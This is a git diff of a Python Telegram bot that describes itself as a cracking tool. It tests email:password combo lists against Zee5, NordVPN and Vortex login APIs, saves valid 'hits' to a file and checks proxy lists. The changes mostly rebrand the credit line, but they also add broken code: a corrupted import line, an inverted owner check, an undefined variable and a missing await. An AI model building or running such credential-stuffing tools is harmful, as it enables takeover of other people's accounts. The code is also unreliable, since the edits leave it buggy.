@@ -1,5 +1,5 @@
 import os
-import telethon
+crackingtoolsbot.pyimport telethon
 import requests
 from telethon import TelegramClient, events, functions, Button
 from telethon.tl.functions.users import GetFullUserRequest
@@ -25,22 +25,6 @@ data = {
 data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}
 
 
-face = {
-	"Accept-Encoding": "gzip, deflate, br",
-	"Accept-Language": "en-US,en;q=0.9",
-	"Connection": "keep-alive",
-	"Content-Length": "136",
-	"Content-Type": "application/json;charset=UTF-8",
-	"Host": "userauth.voot.com",
-	"Origin": "https://www.voot.com",
-	"Referer": "https://www.voot.com",
-	"Sec-Fetch-Dest": "empty",
-	"Sec-Fetch-Mode": "cors",
-	"Sec-Fetch-Site": "same-site",
-	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66"
-}
-
-
 @UltraBot.on(events.NewMessage(pattern="^/proxy$"))
 async def Devsexpo(event):
     if event.sender_id != Config.OWNER_ID:
@@ -55,7 +39,7 @@ async def Devsexpo(event):
         "CHECKING PROXIES... PLEASE WAIT. MAY TAKE TIME DEPENDING ON NUMBER OF PROXIES."
     )
     pablo = await event.get_reply_message()
-    if pablo == None:
+    if not pablo.media:
         await event.reply('Reply To File')
         return
     escobar = await UltraBot.download_media(pablo.media, Config.DL_LOCATION)
@@ -75,18 +59,16 @@ async def Devsexpo(event):
         )
     elif Counter >= 1:
         file1 = open("goood.txt", "a")
-        file1.write("\nCHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @DevsExpo. \n")
+        file1.write("\nCHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @ExploitzBots. \n")
         file1.close()
         ok.delete()
         await UltraBot.send_file(
             event.chat_id,
             "goood.txt",
-            caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**CHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @DevsExpo.**",
+            caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**CHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @ExploitzBots.**",
         )
         os.remove(escobar)
         os.remove("goood.txt")
-
-
 
 
 @UltraBot.on(events.NewMessage(pattern="^/zee5 ?(.*)"))
@@ -109,15 +91,17 @@ async def Devsexpo(event):
         hits = 0
         bads = 0
         lol = await event.get_reply_message()
-        if lol == None:
+        if not lol.media:
             await ok.edit('Reply To File')
             return
         starky = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
-        with open(starky) as f:
-            stark_dict = f.read().splitlines()
-        if len(stark_dict) > 30:
+        file = open(starky, "r")
+        lines = file.readlines()
+        if len(lines) > 20:
             await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
             return
+        for line in lines:
+            stark_dict.append(line)
         os.remove(starky)
         for i in stark_dict:
             starkm = i.split(":")
@@ -139,7 +123,7 @@ async def Devsexpo(event):
             return
         with open("hits.txt", "w") as hitfile:
             for s in hits_dict:
-                hitfile.write(s + " | @DevsExpo")
+                hitfile.write(s + " | @ExploitzBots")
         ok.delete()
         await UltraBot.send_file(
             event.chat_id,
@@ -162,34 +146,10 @@ async def Devsexpo(event):
         meke = requests.get(
             f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
         ).json()
-        beautifuln = f"""
-💖 **Checked Zee5 Account**
-**Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is Invalid. 😔
-
-🔱 **Checked By:-** {event.sender_id}
-
-**✅Better Luck Next Time, Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
-
-        beautiful = f"""
-💖 **Checked Zee5 Account**
-**Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is valid.😀
-**Login Here**: www.zee5.com
-
-🔱 **Checked By:-** {event.sender_id}
-
-**✅Send Screenshot To @DevsExpo. Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
         if meke.get("token"):
-            await event.reply(beautiful)
+            await event.reply("`Yay, This is A Hit`")
         else:
-            await event.reply(beautifuln)
+            await event.reply("`So Sad, This is Invalid Account`")
 
 
 @UltraBot.on(events.NewMessage(pattern="^/nord ?(.*)"))
@@ -212,15 +172,17 @@ async def Devsexpo(event):
         hits = 0
         bads = 0
         lol = await event.get_reply_message()
-        if lol == None:
+        if not lol.media:
             await event.reply('Reply To File')
             return
         starky = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
-        with open(starky) as f:
-            stark_dict = f.read().splitlines()
-        if len(stark_dict) > 30:
+        file = open(starky, "r")
+        lines = file.readlines()
+        if len(lines) > 20:
             await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
             return
+        for line in lines:
+            stark_dict.append(line)
         os.remove(starky)
         for i in stark_dict:
             starkm = i.split(":")
@@ -245,7 +207,7 @@ async def Devsexpo(event):
             return
         with open("hits.txt", "w") as hitfile:
             for s in hits_dict:
-                hitfile.write(s + " | @DevsExpo")
+                hitfile.write(s + " | @ExploitzBots")
         ok.delete()
         await UltraBot.send_file(
             event.chat_id,
@@ -271,34 +233,10 @@ async def Devsexpo(event):
             headers=data,
             json=sedlyf,
         ).json()
-        beautifuln = f"""
-💖 **Checked Nord Account**
-**Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is Invalid. 😔
-
-🔱 **Checked By:-** {event.sender_id}
-
-**✅Better Luck Next Time, Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
-
-        beautiful = f"""
-💖 **Checked Nord Account**
-**Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is valid.😀
-**Login Here**: www.nordvpn.com
-
-🔱 **Checked By:-** {event.sender_id}
-
-**✅Send Screenshot To @DevsExpo. Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
         if meke.get("token"):
-            await event.reply(beautiful)
+            await event.reply("`Yay, This is A Hit.`")
         else:
-            await event.reply(beautifuln)
+            await event.reply("`So Sad, This is Invalid Account.`")
 
 
 @UltraBot.on(events.NewMessage(pattern="^/vortex ?(.*)"))
@@ -321,15 +259,17 @@ async def Devsexpo(event):
         hits = 0
         bads = 0
         lol = await event.get_reply_message()
-        if lol == None:
+        if not lol.media:
             await event.reply('Reply To File')
             return
         starky = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
-        with open(starky) as f:
-            stark_dict = f.read().splitlines()
-        if len(stark_dict) > 20:
+        file = open(starky, "r")
+        lines = file.readlines()
+        if len(lines) > 20:
             await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
             return
+        for line in lines:
+            stark_dict.append(line)
         os.remove(starky)
         for i in stark_dict:
             starkm = i.split(":")
@@ -352,7 +292,7 @@ async def Devsexpo(event):
             return
         with open("hits.txt", "w") as hitfile:
             for s in hits_dict:
-                hitfile.write(s + " | @DevsExpo")
+                hitfile.write(s + " | @ExploitzBots")
         ok.delete()
         await UltraBot.send_file(
             event.chat_id,
@@ -376,34 +316,10 @@ async def Devsexpo(event):
         meke = requests.post(
             url="https://vortex-api.gg/login", headers=data2, json=sedlyf
         ).json()
-        beautifuln = f"""
-💖 **Checked Vortex Account**
-**Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is Invalid. 😔
-
-🔱 **Checked By:-** {event.sender_id}
-
-**✅Better Luck Next Time, Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
-
-        beautiful = f"""
-💖 **Checked Vortex Account**
-**Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is valid.😀
-**Login Here**: www.vortex.gg
-
-🔱 **Checked By:-** {event.sender_id}
-
-**✅Send Screenshot To @DevsExpo. Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
         if meke.get("token"):
-            await event.reply(beautiful)
+            await event.reply("`Yay, This is A Hit.`")
         else:
-            await event.reply(beautifuln)
+            await event.reply("`So Sad, This is Invalid Account.`")
 
 
 @UltraBot.on(events.NewMessage(func=lambda e: e.is_private))
@@ -434,14 +350,14 @@ async def _(event):
 async def atomz(event):
     replied_user = await UltraBot(GetFullUserRequest(event.sender_id))
     firstname = replied_user.user.first_name
-    await event.reply(f'**Hai, {firstname} !, I Am Simple Cracking Tools Bot. PLease Use /help To See Cmds ! \nBy @DevsExpo**')
+    await event.reply(f'**Hai, {firstname} !, I Am Simple Cracking Tools Bot. PLease Use /help To See Cmds ! \nBy @ExploitzBots**')
     
 @UltraBot.on(events.NewMessage(pattern="^/leave ?(.*)"))
 async def bye(event):
-    if event.sender_id != Config.OWNER_ID:
+    if not event.sender_id != Config.OWNER_ID:
         await event.reply('`Who is This Gey Commanding Me To Leave :/`')
         return
-    okbruh = await UltraBot.get_me()
+    okbruh = await chatbot.get_me()
     await event.reply('Time To leave :(')
     await UltraBot.kick_participant(event.chat_id, okbruh.id)
                 
@@ -450,16 +366,16 @@ async def no_help(event):
     replied_user = await UltraBot(GetFullUserRequest(event.sender_id))
     firstname = replied_user.user.first_name
     lol_br = """
-- /start - start me 
-- /help - ??
-- /zee5 <email:password> - Checks One Account
-- /zee5 combo - Reply To Combos File And Limit is 20.
-- /nord <email:password> - Checks One Account
-- /nord combo - Reply To Combos File And Limit is 20.
-- /vortex <email:password> - Checks One Account
-- /vortex combo - Reply To Combos File And Limit is 20.
-- /proxy - Reply To Proxy File Only, Check Your Proxies
-BY @DevsExpo
+    /start - start me 
+    /help - ??
+    /zee5 <email:password> - Checks One Account
+    /zee5 combo - Reply To Combos File And Limit is 20.
+    /nord <email:password> - Checks One Account
+    /nord combo - Reply To Combos File And Limit is 20.
+    /vortex <email:password> - Checks One Account
+    /vortex combo - Reply To Combos File And Limit is 20.
+    /proxy - Reply To Proxy File Only, Check Your Proxies
+    BY @ExploitzBots
     """
     await event.reply(f'**Hai, {firstname} !, Here is List Of Cmds \n{lol_br}**')
                 
@@ -468,7 +384,7 @@ async def atomz(event):
     error_count = 0
     msgtobroadcast = event.pattern_match.group(1)
     if event.sender_id != Config.OWNER_ID:
-        await event.reply("**Fuck OFF Bitch !**")
+        event.reply("**Fuck OFF Bitch !**")
         return
     hmm = get_all_users()
     for starkcast in hmm:
